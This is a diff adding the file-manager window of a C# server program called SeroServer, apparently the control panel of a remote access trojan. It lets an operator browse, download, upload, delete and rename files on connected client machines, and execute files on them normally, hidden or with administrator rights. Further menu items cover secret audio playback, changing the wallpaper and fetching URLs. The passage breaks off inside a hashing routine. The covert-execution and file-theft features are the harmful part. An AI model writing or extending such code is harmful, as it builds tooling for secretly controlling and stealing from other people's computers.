@@ -1,0 +1,1596 @@
+using System.Collections.ObjectModel;
+using System.IO;
+using System.Windows;
+using System.Windows.Input;
+using System.Windows.Media.Imaging;
+using DevExpress.Xpf.Core;
+using Newtonsoft.Json;
+using SeroServer.Net;
+using SeroServer.Protocol;
+
+namespace SeroServer.UI;
+
+public partial class FileManagerWindow : ThemedWindow
+{
+    private readonly TlsServer _server;
+    private          string    _clientId;
+    private readonly string    _hwid;
+    private readonly string    _tempPrefix;   // per-client prefix for preview temp files
+    private readonly ObservableCollection<FileEntryVM> _entries = [];
+    private readonly Stack<string> _history = new();
+    private string _currentPath = "";
+
+    // Pending async results
+    private TaskCompletionSource<string>? _pendingList;
+    private TaskCompletionSource<string>? _pendingData;    // Download_Click
+    private TaskCompletionSource<string>? _pendingPreview; // BtnPreview_Click
+    private TaskCompletionSource<string>? _pendingHash;
+    private TaskCompletionSource<string>? _pendingAck;
+    // Monotone counter — incremented before each preview request.
+    // Checked after the await so a stale response that completed the TCS is silently discarded.
+    private int  _previewSerial;
+    private bool _previewIsPlaceholder = true;
+
+    public FileManagerWindow(TlsServer server, string clientId, string clientLabel)
+    {
+        InitializeComponent();
+        RubberBandSelector.Enable(GridFiles);
+        TypeToSelect.Enable(GridFiles, o => (o as FileEntryVM)?.Name ?? "");
+        _server     = server;
+        _clientId   = clientId;
+        _hwid       = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
+        _tempPrefix = "sero_prev_" + string.Concat(clientId.Select(c => char.IsLetterOrDigit(c) ? c : '_')) + "_";
+        TxtTitle.Text = clientLabel;
+        GridFiles.ItemsSource = _entries;
+
+        _server.RegisterHandler(clientId, PacketType.FmListResult, pkt => { _pendingList?.TrySetResult(pkt.Data); });
+        // FmFileData is used by both Download and Preview — route to whichever is waiting.
+        // Explicit if/else prevents a single response completing both TCS instances when they
+        // happen to be set simultaneously (e.g. rapid selection change during download).
+        _server.RegisterHandler(clientId, PacketType.FmFileData, pkt =>
+        {
+            var pd = _pendingData;
+            if (pd != null) pd.TrySetResult(pkt.Data);
+            else _pendingPreview?.TrySetResult(pkt.Data);
+        });
+        _server.RegisterHandler(clientId, PacketType.FmHashResult,  pkt => { _pendingHash?.TrySetResult(pkt.Data); });
+        _server.RegisterHandler(clientId, PacketType.FmAck,         pkt => { _pendingAck?.TrySetResult(pkt.Data); });
+
+        // WMF pipeline teardown (Source = null) blocks the UI thread for several seconds.
+        // Fix: Stop() playback (fast), hide the window immediately, close for real on the
+        // next Normal-priority tick, then retry temp-file deletion on a background thread
+        // once GC finalises the MediaElement and WMF releases the file lock.
+        bool _wmfCleanupDone = false;
+        Closing += (s, e) =>
+        {
+            if (_wmfCleanupDone) return;
+            e.Cancel = true;
+            _wmfCleanupDone = true;
+            try { PreviewVideo.Stop(); } catch { }
+            Hide();
+            var tmp = _previewTempFile;
+            _previewTempFile = null;
+            // Close on next pump tick — no Source=null so UI thread never blocks
+            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, () => Close());
+            // Delete temp file on a background thread once WMF releases the lock
+            if (tmp != null)
+                _ = Task.Run(async () =>
+                {
+                    await Task.Delay(600);
+                    GC.Collect(); GC.WaitForPendingFinalizers();
+                    for (int i = 0; i < 40; i++)
+                    {
+                        try { System.IO.File.Delete(tmp); return; } catch { }
+                        await Task.Delay(250);
+                    }
+                });
+        };
+        Lang.LanguageChanged += ApplyLanguage;
+        ApplyLanguage();
+        _server.ClientDisconnected += OnClientDisconnected;
+        _server.ClientConnected    += OnClientConnected;
+        Closed += (_, _) =>
+        {
+            _server.UnregisterHandler(_clientId, PacketType.FmListResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmFileData);
+            _server.UnregisterHandler(_clientId, PacketType.FmHashResult);
+            _server.UnregisterHandler(_clientId, PacketType.FmAck);
+            _server.ClientDisconnected -= OnClientDisconnected;
+            _server.ClientConnected    -= OnClientConnected;
+            Lang.LanguageChanged -= ApplyLanguage;
+        };
+        // MediaOpened fires when WMF has fully opened the file — safe moment to call Play()
+        PreviewVideo.MediaOpened  += (_, _) => { PreviewVideo.Play(); _videoPlaying = true; };
+        // MediaEnded: video finished — reset flag so next click restarts instead of pausing
+        PreviewVideo.MediaEnded   += (_, _) => { _videoPlaying = false; };
+        // MediaFailed: codec missing or corrupt file — show user-friendly error
+        PreviewVideo.MediaFailed  += (_, args) =>
+        {
+            _videoPlaying = false;
+            var hr = args.ErrorException?.HResult ?? 0;
+            // 0xC00D0035 = MF_E_FILE_NOT_FOUND, 0xC00D001A = no codec
+            TxtPreviewInfo.Text = hr == unchecked((int)0xC00D001A) || hr == unchecked((int)0x80040265)
+                ? Lang.Get("FM_CODEC_ERROR")
+                : Lang.Get("FM_MEDIA_FAILED");
+            ShowPreviewPanel("empty");
+        };
+
+        Loaded += async (_, _) =>
+        {
+            await Task.Delay(Random.Shared.Next(0, 250));
+            await Navigate("");  // root = drives on Windows; populates DrivesList too
+        };
+    }
+
+    // ── Drives ────────────────────────────────────────
+
+    private void ApplyLanguage()
+    {
+        Title = Lang.Get("FEAT_FILE_MANAGER");
+        if (BtnBack          != null) BtnBack.Content          = Lang.Get("FM_BACK");
+        if (BtnGo            != null) BtnGo.Content            = Lang.Get("FM_GO");
+        if (TxtQuickAccess   != null) TxtQuickAccess.Text      = Lang.Get("FM_QUICK_ACCESS");
+        if (TxtDrives        != null) TxtDrives.Text           = Lang.Get("FM_DRIVES");
+        if (TxtPreviewInfo   != null && _previewIsPlaceholder) TxtPreviewInfo.Text = Lang.Get("FM_SELECT_FILE");
+        if (MnuFmRefresh     != null) MnuFmRefresh.Header     = Lang.Get("ACT_REFRESH");
+        if (MnuFmExecNormal  != null) MnuFmExecNormal.Header  = Lang.Get("ACT_EXEC_NORMAL");
+        if (MnuFmExecHidden  != null) MnuFmExecHidden.Header  = Lang.Get("ACT_EXEC_HIDDEN");
+        if (MnuFmExecAdmin   != null) MnuFmExecAdmin.Header   = Lang.Get("ACT_EXEC_ADMIN");
+        if (MnuFmDownload    != null) MnuFmDownload.Header    = Lang.Get("ACT_DOWNLOAD");
+        if (MnuFmUpload      != null) MnuFmUpload.Header      = Lang.Get("ACT_UPLOAD");
+        if (MnuFmNewFolder   != null) MnuFmNewFolder.Header   = Lang.Get("ACT_NEW_FOLDER");
+        if (MnuFmRename      != null) MnuFmRename.Header      = Lang.Get("ACT_RENAME");
+        if (MnuFmDelete      != null) MnuFmDelete.Header      = Lang.Get("ACT_DELETE");
+        if (MnuFmHash        != null) MnuFmHash.Header        = Lang.Get("FM_HASH");
+        if (MnuFmEdit        != null) MnuFmEdit.Header        = Lang.Get("FM_EDIT");
+        if (MnuFmShowHide    != null) MnuFmShowHide.Header    = Lang.Get("FM_SHOW_HIDE");
+        if (MnuFmSetAttr     != null) MnuFmSetAttr.Header     = Lang.Get("FM_SET_ATTR");
+        if (MnuFmWallpaper   != null) MnuFmWallpaper.Header   = Lang.Get("FM_WALLPAPER");
+        if (MnuFmPlayMusicSecret != null) MnuFmPlayMusicSecret.Header = Lang.Get(_isPlayingAudio ? "FM_STOP_AUDIO" : "FM_PLAY_MUSIC_SECRET");
+        if (MnuFmZip             != null) MnuFmZip.Header             = Lang.Get("FM_ZIP");
+        if (MnuFmDownloadUrl != null) MnuFmDownloadUrl.Header = Lang.Get("FM_DOWNLOAD_URL");
+        if (MnuFmFileSearch  != null) MnuFmFileSearch.Header  = Lang.Get("FM_FILE_SEARCH_HERE");
+        if (MnuFmCopyName    != null) MnuFmCopyName.Header    = Lang.Get("ACT_COPY_NAME");
+        if (MnuFmCopyPath    != null) MnuFmCopyPath.Header    = Lang.Get("ACT_COPY_PATH");
+        if (BtnFileSearch    != null) BtnFileSearch.ToolTip   = Lang.Get("FM_SEARCH_TOOLTIP");
+        if (GridFiles?.Columns.Count >= 6)
+        {
+            GridFiles.Columns[0].Header = Lang.Get("FM_COL_NAME");
+            GridFiles.Columns[1].Header = Lang.Get("FM_COL_TYPE");
+            GridFiles.Columns[2].Header = Lang.Get("FM_COL_SIZE");
+            GridFiles.Columns[3].Header = Lang.Get("FM_COL_MODIFIED");
+            GridFiles.Columns[4].Header = Lang.Get("FM_COL_CREATED");
+            GridFiles.Columns[5].Header = Lang.Get("FM_COL_ATTR");
+        }
+    }
+
+    // Drives are populated from Navigate("") — stub returns drive list for empty path.
+    // Called by Navigate() after populating _entries.
+    private void UpdateDrivesFromEntries(IEnumerable<FileEntryVM> entries)
+    {
+        var drives = entries
+            .Where(e => e.IsDir && e.Name.Length >= 2 && e.Name[1] == ':')
+            .Select(e => e.Name.TrimEnd('\\', '/') + "\\")
+            .ToList();
+        if (drives.Count > 0)
+        {
+            DrivesList.Items.Clear();
+            foreach (var d in drives) DrivesList.Items.Add(new DriveItemVM(d));
+        }
+    }
+
+    // ── Transfer strip ────────────────────────────────
+
+    private void ShowTransfer(string name, string status)
+        => _ = Dispatcher.BeginInvoke(() =>
+        {
+            TxtTransferName.Text   = name.Length > 30 ? name[..30] + "…" : name;
+            TxtTransferStatus.Text = status;
+            TxtTransferPct.Text    = "";
+            TransferStrip.Visibility = Visibility.Visible;
+        });
+
+    private void HideTransfer()
+        => _ = Dispatcher.BeginInvoke(() =>
+        {
+            TxtTransferPct.Text = "";
+            TransferStrip.Visibility = Visibility.Collapsed;
+        });
+
+    // ── Navigation ────────────────────────────────────
+
+    internal async Task NavigateTo(string path) => await Navigate(path);
+
+    private void FileSearch_Click(object sender, System.Windows.RoutedEventArgs e)
+    {
+        var win = new FileSearchWindow(_server, _clientId, TxtTitle.Text);
+        win.SetRootPath(TxtPath.Text);
+        win.Show();
+    }
+
+    private void FileSearchCtx_Click(object sender, System.Windows.RoutedEventArgs e)
+    {
+        var sel = GridFiles.SelectedItem as FileEntryVM;
+        var root = sel?.IsDir == true
+            ? System.IO.Path.Combine(_currentPath, sel.Name)
+            : _currentPath;
+        var win = new FileSearchWindow(_server, _clientId, TxtTitle.Text);
+        win.SetRootPath(root);
+        win.Show();
+    }
+
+    private async Task Navigate(string path)
+    {
+        TxtStatus.Text = Lang.Get("FM_LOADING");
+        try
+        {
+            // Cancel any concurrent Navigate so its response doesn't land in the new TCS.
+            _pendingList?.TrySetCanceled();
+            var thisTcs = new TaskCompletionSource<string>();
+            _pendingList = thisTcs;
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmList,
+                Data = JsonConvert.SerializeObject(new FmListData { Path = path })
+            });
+
+            // Await the local TCS — if _pendingList was replaced by a newer Navigate,
+            // thisTcs will be canceled by it and we fall into the catch below.
+            var json = await thisTcs.Task.WaitAsync(TimeSpan.FromSeconds(15));
+            var result = JsonConvert.DeserializeObject<FmListResultData>(json);
+            if (result == null) { TxtStatus.Text = Lang.Get("FM_NO_RESPONSE"); return; }
+            if (!string.IsNullOrEmpty(result.Error))
+            {
+                var err = result.Error;
+                // Strip .NET resource key prefix (e.g. "IO_PathNotFound_Path, C:\foo" → "Path not found: C:\foo")
+                if (err.StartsWith("IO_PathNotFound_Path,"))     err = string.Format(Lang.Get("FM_ERR_PATH_NOT_FOUND"), err[(err.IndexOf(',') + 1)..].Trim());
+                else if (err.StartsWith("IO_FileNotFound,"))     err = string.Format(Lang.Get("FM_ERR_FILE_NOT_FOUND"), err[(err.IndexOf(',') + 1)..].Trim());
+                else if (err.StartsWith("UnauthorizedAccess"))   err = string.Format(Lang.Get("FM_ERR_ACCESS_DENIED"),  err[(err.IndexOf(',') + 1)..].TrimStart());
+                TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), err);
+                return;
+            }
+
+            if (!string.IsNullOrEmpty(_currentPath) && result.Path != _currentPath)
+                _history.Push(_currentPath);
+
+            _currentPath = result.Path;
+            TxtPath.Text = _currentPath;
+            _entries.Clear();
+            foreach (var e in result.Entries.OrderByDescending(x => x.IsDir).ThenBy(x => x.Name))
+                _entries.Add(new FileEntryVM(e));
+
+            // If root navigation, populate drives from the result
+            if (string.IsNullOrEmpty(path) || path == "\\")
+                UpdateDrivesFromEntries(_entries);
+
+            var dirs  = result.Entries.Count(x => x.IsDir);
+            var files = result.Entries.Count - dirs;
+            TxtStatus.Text = string.Format(Lang.Get("FM_DIR_STAT"), result.Path, files, dirs);
+            if (TxtFileCount != null)
+                TxtFileCount.Text = string.Format(Lang.Get("FM_FILE_COUNT"), files, dirs);
+        }
+        catch (TimeoutException)           { TxtStatus.Text = Lang.Get("FM_TIMEOUT"); }
+        catch (OperationCanceledException) { /* superseded by a newer Navigate call */ }
+        catch (Exception ex)               { TxtStatus.Text = ex.Message; }
+        finally { _pendingList = null; }
+    }
+
+    // ── Context menu actions ──────────────────────────
+
+    private async void Download_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        if (_pendingData != null) return;
+        var ext = System.IO.Path.GetExtension(row.Name);
+        var filter = string.IsNullOrEmpty(ext)
+            ? "All files (*.*)|*.*"
+            : $"{ext.TrimStart('.').ToUpper()} files (*{ext})|*{ext}|All files (*.*)|*.*";
+        var dlg = new Microsoft.Win32.SaveFileDialog { FileName = row.Name, Filter = filter };
+        if (dlg.ShowDialog() != true) return;
+
+        var sw = System.Diagnostics.Stopwatch.StartNew();
+        TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADING"), row.Name);
+        ServerWindow.ReportGlobalActivity("Downloading", row.Name, "running");
+        ShowTransfer(row.Name, Lang.Get("FM_REQUESTING"));
+        try
+        {
+            // Kill any in-flight auto-preview so its FmFileData response isn't routed
+            // to _pendingData and download doesn't receive the wrong file's content.
+            _pendingPreview?.TrySetCanceled();
+            _pendingPreview = null;
+            _previewSerial++;
+            _pendingData = new TaskCompletionSource<string>();
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmDownload,
+                Data = JsonConvert.SerializeObject(new FmDownloadData { Path = _currentPath.TrimEnd('\\', '/') + "\\" + row.Name })
+            });
+            ShowTransfer(row.Name, Lang.Get("FM_RECEIVING"));
+            var json = await _pendingData.Task.WaitAsync(TimeSpan.FromSeconds(60));
+            var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
+            if (result == null || !string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), result?.Error); ServerWindow.ReportGlobalActivity("Download failed", row.Name, "failed"); return; }
+            ShowTransfer(row.Name, Lang.Get("FM_DECODING"));
+            // Offload Base64 decode to background thread — large files block UI if decoded inline
+            var bytes = await Task.Run(() => Convert.FromBase64String(result.Data));
+            TxtTransferPct.Text = "50%";
+            ShowTransfer(row.Name, Lang.Get("FM_WRITING"));
+            await File.WriteAllBytesAsync(dlg.FileName, bytes);
+            sw.Stop();
+            TxtTransferPct.Text = "100%";
+            NotificationService.NotifyDownloadComplete();
+            var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
+            TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOADED"), row.Name, bytes.Length.ToString("N0"), elapsed);
+            ServerWindow.ReportGlobalActivity("Download completed", row.Name, "success");
+        }
+        catch (Exception ex) {
+            TxtStatus.Text = string.Format(Lang.Get("FM_DOWNLOAD_FAILED"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Download failed", row.Name, "failed");
+        }
+        finally { _pendingData = null; HideTransfer(); }
+    }
+
+    private async void Upload_Click(object s, RoutedEventArgs e)
+    {
+        if (_pendingAck != null || _pendingHash != null) return;
+        var dlg = new Microsoft.Win32.OpenFileDialog { Multiselect = false };
+        if (dlg.ShowDialog() != true) return;
+        if (string.IsNullOrEmpty(_currentPath))
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), "Navigate to a folder first");
+            return;
+        }
+        var destPath = Path.Combine(_currentPath, Path.GetFileName(dlg.FileName));
+        var uploadName = Path.GetFileName(dlg.FileName);
+
+        var sw = System.Diagnostics.Stopwatch.StartNew();
+        TxtStatus.Text = string.Format(Lang.Get("FM_UPLOADING"), uploadName);
+        ServerWindow.ReportGlobalActivity("Uploading", uploadName, "running");
+        _pendingAck = new TaskCompletionSource<string>(); // claim slot before any await so guard stays effective
+        ShowTransfer(uploadName, Lang.Get("FM_READING"));
+        try
+        {
+            var bytes = await File.ReadAllBytesAsync(dlg.FileName);
+            ShowTransfer(uploadName, string.Format(Lang.Get("FM_ENCODING"), bytes.Length.ToString("N0")));
+            // Base64 encoding + JSON serialisation are CPU-heavy — run off the UI thread
+            // so the window stays responsive and large files don't cause a freeze/OOM crash.
+            var payload = await Task.Run(() =>
+                JsonConvert.SerializeObject(new FmUploadData { Path = destPath, Data = Convert.ToBase64String(bytes) }));
+            TxtTransferPct.Text = "50%";
+            ShowTransfer(uploadName, Lang.Get("FM_SENDING"));
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmUpload,
+                Data = payload
+            });
+            var ackJson = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(30));
+            var ack = JsonConvert.DeserializeObject<FmAckData>(ackJson);
+            if (ack != null && !ack.Success && !string.IsNullOrEmpty(ack.Error))
+                throw new Exception(ack.Error);
+            sw.Stop();
+            TxtTransferPct.Text = "100%";
+            NotificationService.NotifyUploadComplete();
+            var elapsed = sw.Elapsed.TotalSeconds < 60 ? $"{sw.Elapsed.TotalSeconds:F1}s" : $"{sw.Elapsed.TotalMinutes:F0}m {sw.Elapsed.Seconds}s";
+            TxtStatus.Text = string.Format(Lang.Get("FM_UPLOADED"), uploadName, bytes.Length.ToString("N0"), elapsed);
+            ServerWindow.ReportGlobalActivity("Upload completed", uploadName, "success");
+            await Navigate(_currentPath);
+        }
+        catch (Exception ex) {
+            TxtStatus.Text = string.Format(Lang.Get("FM_UPLOAD_FAILED"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Upload failed", uploadName, "failed");
+        }
+        finally { _pendingAck = null; HideTransfer(); }
+    }
+
+    private async void Delete_Click(object s, RoutedEventArgs e)
+    {
+        var selected = GridFiles.SelectedItems.Cast<FileEntryVM>().ToList();
+        if (selected.Count == 0) return;
+        if (_pendingAck != null || _pendingHash != null) return;
+        var msg = selected.Count == 1
+            ? string.Format(Lang.Get("FM_CONFIRM_DELETE_1"), selected[0].Name)
+            : string.Format(Lang.Get("FM_CONFIRM_DELETE_N"), selected.Count);
+        if (!ShowConfirmDialog(msg, Lang.Get("MSG_CONFIRM"))) return;
+        
+        int total = selected.Count;
+        int successCount = 0;
+        int failedCount = 0;
+        string? lastError = null;
+
+        if (total == 1)
+        {
+            var row = selected[0];
+            var path = Path.Combine(_currentPath, row.Name);
+            TxtStatus.Text = string.Format(Lang.Get("FM_DELETING"), row.Name);
+            ServerWindow.ReportGlobalActivity("Delete file", row.Name, "running");
+            ServerWindow.LogGlobal($"[FM] Deleting file '{path}' on client {_clientId}...");
+            _pendingAck = new TaskCompletionSource<string>();
+            try
+            {
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmDelete, Data = JsonConvert.SerializeObject(new FmDeleteData { Path = path }) });
+                var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(10));
+                var ack = JsonConvert.DeserializeObject<FmAckData>(json);
+                if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
+                {
+                    successCount++;
+                    NotificationService.NotifyFileDeleted();
+                    TxtStatus.Text = string.Format(Lang.Get("FM_DELETED"), row.Name);
+                    ServerWindow.ReportGlobalActivity("Delete completed", row.Name, "success");
+                    ServerWindow.LogGlobal($"[FM] Deleted file '{path}' on client {_clientId}.");
+                }
+                else
+                {
+                    failedCount++;
+                    lastError = ack?.Error ?? "Unknown error";
+                    TxtStatus.Text = string.Format(Lang.Get("FM_DELETE_FAILED"), lastError);
+                    ServerWindow.ReportGlobalActivity("Delete failed", row.Name, "failed");
+                    ServerWindow.LogGlobal($"[FM] Delete failed for '{path}' on client {_clientId}: {lastError}");
+                }
+            }
+            catch (Exception ex)
+            {
+                failedCount++;
+                lastError = ex.Message;
+                TxtStatus.Text = string.Format(Lang.Get("FM_DELETE_FAILED"), lastError);
+                ServerWindow.ReportGlobalActivity("Delete failed", row.Name, "failed");
+                ServerWindow.LogGlobal($"[FM] Delete failed for '{path}' on client {_clientId}: {lastError}");
+            }
+            finally { _pendingAck = null; }
+        }
+        else
+        {
+            TxtStatus.Text = string.Format(Lang.Get("FM_DELETING_N"), total);
+            ServerWindow.ReportGlobalActivity("Delete items", $"{total} items", "running");
+            ServerWindow.LogGlobal($"[FM] Deleting {total} items on client {_clientId}...");
+            
+            for (int i = 0; i < total; i++)
+            {
+                var row = selected[i];
+                var path = Path.Combine(_currentPath, row.Name);
+                TxtStatus.Text = string.Format(Lang.Get("FM_DELETING_PROGRESS"), i + 1, total, row.Name);
+                
+                _pendingAck = new TaskCompletionSource<string>();
+                try
+                {
+                    await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmDelete, Data = JsonConvert.SerializeObject(new FmDeleteData { Path = path }) });
+                    var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(10));
+                    var ack = JsonConvert.DeserializeObject<FmAckData>(json);
+                    if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
+                    {
+                        successCount++;
+                    }
+                    else
+                    {
+                        failedCount++;
+                        lastError = ack?.Error ?? "Unknown error";
+                    }
+                }
+                catch (OperationCanceledException) { failedCount++; break; } // client disconnected — stop loop
+                catch (Exception ex)
+                {
+                    failedCount++;
+                    lastError = ex.Message;
+                }
+                finally { _pendingAck = null; }
+            }
+
+            if (successCount > 0) NotificationService.NotifyFileDeleted();
+            if (failedCount == 0)
+            {
+                TxtStatus.Text = string.Format(Lang.Get("FM_DELETED_N"), successCount);
+                ServerWindow.ReportGlobalActivity("Delete completed", $"{successCount} items", "success");
+                ServerWindow.LogGlobal($"[FM] Bulk delete completed on client {_clientId}: deleted {successCount} of {total} items.");
+            }
+            else
+            {
+                TxtStatus.Text = string.Format(Lang.Get("FM_DELETE_PARTIAL"), successCount, failedCount);
+                ServerWindow.ReportGlobalActivity("Delete failed", $"{failedCount} of {total} failed", "failed");
+                ServerWindow.LogGlobal($"[FM] Bulk delete finished on client {_clientId} with errors: deleted {successCount}, failed {failedCount}. Last error: {lastError}");
+            }
+        }
+        await Navigate(_currentPath);
+    }
+
+    private async void Rename_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row) return;
+        if (_pendingAck != null || _pendingHash != null) return;
+        var newName = PromptInput(string.Format(Lang.Get("FM_RENAME_PROMPT"), row.Name), row.Name);
+        if (string.IsNullOrWhiteSpace(newName) || newName == row.Name) return;
+        var oldPath = Path.Combine(_currentPath, row.Name);
+        var newPath = Path.Combine(_currentPath, newName);
+        
+        TxtStatus.Text = string.Format(Lang.Get("FM_RENAMING"), row.Name, newName);
+        ServerWindow.ReportGlobalActivity("Rename item", row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Renaming '{oldPath}' to '{newName}' on client {_clientId}...");
+        
+        _pendingAck = new TaskCompletionSource<string>();
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmRename, Data = JsonConvert.SerializeObject(new FmRenameData { OldPath = oldPath, NewPath = newPath }) });
+            var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15));
+            var ack = JsonConvert.DeserializeObject<FmAckData>(json);
+            if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
+            {
+                TxtStatus.Text = string.Format(Lang.Get("FM_RENAMED"), row.Name, newName);
+                ServerWindow.ReportGlobalActivity("Rename completed", newName, "success");
+                ServerWindow.LogGlobal($"[FM] Renamed '{oldPath}' to '{newPath}' on client {_clientId}.");
+            }
+            else
+            {
+                var err = ack?.Error ?? "Unknown error";
+                TxtStatus.Text = string.Format(Lang.Get("FM_RENAME_FAILED"), err);
+                ServerWindow.ReportGlobalActivity("Rename failed", row.Name, "failed");
+                ServerWindow.LogGlobal($"[FM] Rename failed for '{oldPath}' to '{newPath}' on client {_clientId}: {err}");
+            }
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("FM_RENAME_FAILED"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Rename failed", row.Name, "failed");
+            ServerWindow.LogGlobal($"[FM] Rename failed for '{oldPath}' to '{newPath}' on client {_clientId}: {ex.Message}");
+        }
+        finally { _pendingAck = null; }
+        await Navigate(_currentPath);
+    }
+
+    private async void NewFolder_Click(object s, RoutedEventArgs e)
+    {
+        if (_pendingAck != null || _pendingHash != null) return;
+        if (string.IsNullOrEmpty(_currentPath)) { TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), "Navigate to a folder first"); return; }
+        var name = PromptInput(Lang.Get("FM_NEW_FOLDER_NAME"), Lang.Get("FM_NEW_FOLDER_DEF"));
+        if (string.IsNullOrWhiteSpace(name)) return;
+        var path = Path.Combine(_currentPath, name);
+        
+        TxtStatus.Text = string.Format(Lang.Get("FM_CREATING_FOLDER"), name);
+        ServerWindow.ReportGlobalActivity("New folder", name, "running");
+        ServerWindow.LogGlobal($"[FM] Creating folder '{path}' on client {_clientId}...");
+        
+        _pendingAck = new TaskCompletionSource<string>();
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.FmMkDir, Data = JsonConvert.SerializeObject(new FmMkDirData { Path = path }) });
+            var json = await _pendingAck.Task.WaitAsync(TimeSpan.FromSeconds(15));
+            var ack = JsonConvert.DeserializeObject<FmAckData>(json);
+            if (ack != null && (ack.Success || string.IsNullOrEmpty(ack.Error)))
+            {
+                TxtStatus.Text = string.Format(Lang.Get("FM_FOLDER_CREATED"), name);
+                ServerWindow.ReportGlobalActivity("New folder completed", name, "success");
+                ServerWindow.LogGlobal($"[FM] Created folder '{path}' on client {_clientId}.");
+            }
+            else
+            {
+                var err = ack?.Error ?? "Unknown error";
+                TxtStatus.Text = string.Format(Lang.Get("FM_FOLDER_FAILED"), err);
+                ServerWindow.ReportGlobalActivity("New folder failed", name, "failed");
+                ServerWindow.LogGlobal($"[FM] New folder creation failed for '{path}' on client {_clientId}: {err}");
+            }
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("FM_FOLDER_FAILED"), ex.Message);
+            ServerWindow.ReportGlobalActivity("New folder failed", name, "failed");
+            ServerWindow.LogGlobal($"[FM] New folder creation failed for '{path}' on client {_clientId}: {ex.Message}");
+        }
+        finally { _pendingAck = null; }
+        await Navigate(_currentPath);
+    }
+
+    private async void Exec_Normal_Click(object s, RoutedEventArgs e) => await ExecFile("normal");
+    private async void Exec_Hidden_Click(object s, RoutedEventArgs e) => await ExecFile("hidden");
+    private async void Exec_Admin_Click(object s, RoutedEventArgs e)  => await ExecFile("runas");
+
+    private async Task ExecFile(string mode)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row) return;
+        var path = Path.Combine(_currentPath, row.Name);
+
+        ServerWindow.ReportGlobalActivity("Execute file", row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Executing file '{path}' (mode: {mode}) on client {_clientId}...");
+
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmExec,
+                Data = JsonConvert.SerializeObject(new FmExecData { Path = path, Mode = mode })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("FM_EXECUTED"), row.Name, mode);
+            ServerWindow.ReportGlobalActivity("Execute file", row.Name, "complete");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Execute file", row.Name, "failed");
+        }
+    }
+
+    private async void Hash_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is not FileEntryVM row || row.IsDir) return;
+        if (_pendingAck != null || _pendingHash != null) return;
+        var path = Path.Combine(_currentPath, row.Name);
+        TxtStatus.Text = Lang.Get("FM_COMPUTING_HASH");
+        ServerWindow.ReportGlobalActivity("Compute hash", row.Name, "running");
+        ServerWindow.LogGlobal($"[FM] Requesting hash for '{path}' on client {_clientId}...");
+        
+        _pendingHash = new TaskCompletionSource<string>();
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmHash,
+                Data = JsonConvert.SerializeObject(new FmHashData { Path = path })
+            });
+            var json = await _pendingHash.Task.WaitAsync(TimeSpan.FromSeconds(30));
+            var r = JsonConvert.DeserializeObject<FmHashResultData>(json);
+            if (r != null && string.IsNullOrEmpty(r.Error))
+            {
+                try { Clipboard.SetText(r.Hash); } catch { }
+                var hashPrefix = r.Hash.Length >= 16 ? r.Hash[..16] : r.Hash;
+                ShowInfoDialog($"SHA-256: {r.Hash}\n\n{Lang.Get("FM_COPIED_CLIPBOARD")}", row.Name);
+                TxtStatus.Text = string.Format(Lang.Get("FM_HASH_RESULT"), hashPrefix);
+                ServerWindow.ReportGlobalActivity("Hash completed", row.Name, "success");
+                ServerWindow.LogGlobal($"[FM] Hash computed for '{path}' on client {_clientId}: {r.Hash}");
+            }
+            else
+            {
+                var err = r?.Error ?? "Unknown error";
+                TxtStatus.Text = string.Format(Lang.Get("FM_HASH_ERROR"), err);
+                ServerWindow.ReportGlobalActivity("Hash failed", row.Name, "failed");
+                ServerWindow.LogGlobal($"[FM] Hash computation failed for '{path}' on client {_clientId}: {err}");
+            }
+        }
+        catch (TimeoutException)
+        {
+            TxtStatus.Text = Lang.Get("FM_HASH_TIMEOUT");
+            ServerWindow.ReportGlobalActivity("Hash failed", row.Name, "failed");
